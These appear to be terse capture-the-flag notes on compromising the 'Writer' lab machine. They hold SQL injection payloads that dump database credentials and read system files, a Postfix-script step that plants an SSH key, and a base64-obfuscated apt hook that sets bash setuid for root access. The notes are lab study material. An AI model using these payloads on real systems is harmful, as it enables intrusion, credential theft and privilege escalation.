---
title: "Writer"
---

# Writer

```bash
smbclient -L 10.10.11.101 -N --option='client min protocol=SMB2'
```

Manual SQLi - MySQL

ERROR: no retorna una única columna
```sql
' UNION select 1;-- -
```

Welcome 2
```sql
' UNION select 1,2,3,4,5,6;-- -
```

Welcome writer
```sql
' UNION select 1,database(),3,4,5,6;-- -
```

Welcome 10.3.29-MariaDB-0ubuntu0.20.04.1
```sql
' UNION select 1,version(),3,4,5,6;-- -
```

Sacar los nombres de todas las tablas
```sql
' union select 1,group_concat(table_name separator 0x3a),2,null,null,null FROM information_schema.tables --
```

Sacar nombres de columnas de una tabla
```sql
' union select 1,group_concat(column_name separator 0x3a),3,4,5,6 FROM information_schema.columns WHERE table_name='users';-- -
``` 

Extraer datos
```sql
' union select 1,group_concat(username,0x3a,password),2,null,null,null FROM users;-- -
```

Listar privilegios
```
' union select 1,(select group_concat(privilege_type separator 0x3a)),2,null,null,null from information_schema.user_privileges where grantee=user();-- -
```
```
' union select 1,(select group_concat(privilege_type separator 0x3a) from information_schema.user_privileges where grantee=user()),2,null,null,null;-- -
```

Es Administrador
```
' union select 1,current_user,2,null,null,null;-- -
```

Leer archivos
```sql
' union select 1,load_file('../../../../../../etc/passwd'),2,null,null,null FROM information_schema.tables -- -
```

```sql
' union select 1,load_file('../../../../../../etc/samba/smb.conf'),2,null,null,null FROM information_schema.tables -- -
```

# **Postfix**

[25,465,587 - Pentesting SMTP/s - HackTricks](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-smtp/index.html#postfix)

Ejecuta
```
/etc/postfix/master.cf
```

Que ejecuta

```
/etc/postfix/disclaimer
```

Metemos esta línea
```
echo "pubkey kyle" >> /home/john/.ssh/authorized_keys
```

```bash
find / -group management 2>/dev/null | grep -v -e '^/run' -e '^/sys' -e '^/proc'
```
# **Management group**

apt update

```bash
echo '/bin/bash -c "/usr/bin/chmod u+s /bin/bash"' | base64 -w0
```

```bash
echo 'apt::Update::Pre-Invoke {"echo L2Jpbi9iYXNoIC1jICIvdXNyL2Jpbi9jaG1vZCB1K3MgL2Jpbi9iYXNoIgo= | base64 -d | bash"};' > 000-shell
```
